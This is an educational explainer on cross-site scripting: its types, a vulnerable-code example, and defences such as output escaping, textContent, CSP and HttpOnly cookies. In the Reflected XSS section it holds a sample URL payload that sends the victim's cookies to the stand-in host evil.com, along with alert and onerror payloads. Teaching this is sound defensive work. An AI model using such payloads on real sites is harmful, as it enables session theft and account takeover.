# Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is an attack where malicious scripts are injected into a trusted website and executed in the victim's browser — allowing attackers to steal session tokens, redirect users, or take over accounts.

---

### How It Works

A vulnerable page reflects user input directly into the HTML without escaping it:

```html
<!-- User searched for: <script>alert('hacked')</script> -->
<p>You searched for: <script>alert('hacked')</script></p>
```

The browser sees this as valid HTML and executes the script in the context of the *legitimate* site, giving it access to cookies, localStorage, and the DOM.

---

### Types

**Reflected XSS**
The malicious script is embedded in a URL. The server reflects it back in the response for that single request. A victim is tricked into clicking the crafted link.
```
https://example.com/search?q=<script>document.location='https://evil.com?c='+document.cookie</script>
```

**Stored (Persistent) XSS**
The script is saved in the database (e.g., a comment or profile bio) and served to every user who views that content. Far more dangerous — no link-click required.

**DOM-Based XSS**
The attack lives entirely in the client side. JavaScript on the page reads from a dangerous source (e.g., `location.hash`) and writes it to the DOM without sanitisation, never touching the server.

```javascript
// Vulnerable
document.getElementById('output').innerHTML = location.hash.slice(1);

// Attacker visits: https://example.com/page#<img src=x onerror=alert(1)>
```

---

### How to Prevent It

**1. Escape output**
Encode user-controlled data before inserting it into HTML. Most templating engines do this by default.

```python
# ❌ Vulnerable (raw HTML injection)
return f"<p>Hello, {username}</p>"

# ✅ Safe (Django / Jinja2 auto-escapes by default)
return render(request, "hello.html", {"username": username})
```

**2. Use `textContent` instead of `innerHTML`**
```javascript
// ❌ Dangerous
element.innerHTML = userInput;

// ✅ Safe — treated as plain text, not HTML
element.textContent = userInput;
```

**3. Set a Content Security Policy (CSP)**
A CSP header tells the browser which script sources are trusted, blocking inline scripts even if injected.
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

**4. Use `HttpOnly` and `Secure` cookie flags**
Prevents JavaScript from reading session cookies even if XSS occurs.
```
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

**5. Validate and sanitise inputs**
Reject or strip unexpected HTML on the server before it ever reaches the database.

---

> **Key Takeaway** — XSS turns your own website against your users. Escape all output, avoid `innerHTML`, and use a CSP as a safety net.

---

### References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
